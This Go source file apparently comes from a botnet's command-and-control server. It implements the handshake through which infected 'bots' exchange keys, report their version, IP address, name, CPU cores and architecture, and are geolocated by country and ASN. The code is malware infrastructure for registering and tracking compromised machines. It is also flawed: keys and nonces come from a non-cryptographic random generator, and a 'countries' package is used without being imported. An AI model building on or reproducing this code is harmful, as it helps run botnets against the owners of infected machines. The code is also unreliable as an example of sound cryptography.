package clients

import (
	"cnc/internal/clients/packet"
	"cnc/pkg/location"
	"fmt"
	"math/rand"
)

func (bot *Bot) HandleKeyExchange() error {
	_, _, err := bot.Read(OpKeyExchange)
	if err != nil {
		return err
	}

	if _, err = rand.Read(bot.Key); err != nil {
		return err
	}
	if _, err = rand.Read(bot.Nonce); err != nil {
		return err
	}

	if err = bot.Transmit(OpKeyExchange, packet.New().AddBytes(bot.Key).AddBytes(bot.Nonce)); err != nil {
		return err
	}

	bot.State = StateVerifyExchange
	return nil
}

func (bot *Bot) HandleVerifyExchange() error {
	_, _, err := bot.Read(OpVerifyExchange)
	if err != nil {
		return err
	}

	bot.State = StateIdentification
	return bot.Transmit(OpVerifyExchange, packet.New())
}

func (bot *Bot) HandleIdentification() error {
	_, parser, err := bot.Read(OpIdentification)
	if err != nil {
		return err
	}

	if !parser.Readable(
		// version
		new(uint8), new(uint8), new(uint8),

		new(uint32), // address
		new(string), // name

		new(uint16), // cores
		new(uint16), // arch
	) {
		return fmt.Errorf("%w: identification", ErrNotReadable)
	}

	// parse bot version
	bot.Version = Version{
		Major: parser.ParseInt8(),
		Minor: parser.ParseInt8(),
		Patch: parser.ParseInt8(),
	}

	// parse name & ipv4
	bot.Address = Int32ToIPv4(parser.ParseInt32())
	bot.Name = parser.ParseString()
	bot.Cores = parser.ParseInt16()
	bot.Arch = parser.ParseInt16()
	bot.ResolveCountry()

	// send verification packet
	if err = bot.Transmit(OpIdentification, packet.New()); err != nil {
		return err
	}

	bot.State = StateConnected
	return nil
}

// ResolveCountry attempts to resolve the country the bot is from.
func (bot *Bot) ResolveCountry() {
	loc := location.FindGeolocation(bot.Address.String())
	if loc == nil {
		bot.Country, bot.ASN = "unknown", "unknown"
		return
	}

	bot.ASN = loc.Asn
	bot.CountryCode = loc.CountryCode

	country, err := countries.FindCountryByAlpha(loc.CountryCode)
	if err != nil {
		bot.Country = loc.CountryCode
	} else {
		bot.Country = country.Name.Common
	}
}
